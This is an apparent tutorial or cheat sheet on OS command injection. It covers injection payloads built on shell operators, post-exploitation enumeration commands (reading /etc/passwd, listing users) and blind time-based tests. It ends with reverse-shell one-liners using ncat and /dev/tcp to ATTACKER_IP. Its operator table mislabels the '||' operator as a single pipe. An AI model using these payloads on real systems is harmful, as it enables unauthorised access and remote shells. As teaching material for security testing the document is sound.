

Command injection occurs when application input is passed into an operating-system command and the shell interprets attacker-controlled syntax as additional commands. The injected command executes with the privileges of the application.

## **Basic Test**

Start by appending a simple command to a value that you suspect is passed to a shell. For example, in a web app that pings an IP address:

```
127.0.0.1; whoami
```

If `whoami` output is returned, the field is injectable.

## **Shell Operators**

Different operators work depending on the shell and the context. Test all of them — some may be filtered.

**Linux:**

|**Operator**|**Effect**|
|---|---|
|`;`|Execute both commands sequentially|
|`&&`|Execute second only if first succeeds|
|`\|`|Execute second only if first fails|
|`\|`|Pipe output of first into second|
|`` ` ``|Command substitution|
|`$()`|Command substitution|

```
; whoami
&& whoami
|| whoami
| whoami
`whoami`
$(whoami)
```

**Windows:**

```
127.0.0.1 & whoami
```

## **Common Commands After Execution**

Once you confirm injection, enumerate the system.

**Linux:**

```
whoami
id
uname -a
hostname
pwd
ls -la
cat /etc/passwd
```

**Windows:**

```
whoami
hostname
ipconfig /all
net user
tasklist
```

## **Blind Command Injection**

Sometimes the output isn't returned. You can still confirm injection using time-based techniques.

```
127.0.0.1; sleep 5
```

**Windows:**

```
127.0.0.1 & timeout /t 5
```

If the response is delayed by 5 seconds, the command executed.

## **Reverse Shell**

If you can execute commands, you can get a shell.

**Step 1 — Start a listener on your attack machine:**

```
nc -lvnp 4444
```

**Step 2 — Send the reverse shell payload on the target:**

```
ncat ATTACKER_IP 4444 -e /bin/bash
```

Or use a bash one-liner:

```
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## **Key Points**

- Command injection = app input reaches a system shell.
- Test with `;`, `&&`, `||`, `|`, backticks, `$()`.
- Enumerate with `whoami`, `id`, `uname -a`, `hostname`.
- Blind injection → use `sleep` or `timeout`.
- Reverse shell → `nc -lvnp` + `ncat -e` or `/dev/tcp`.
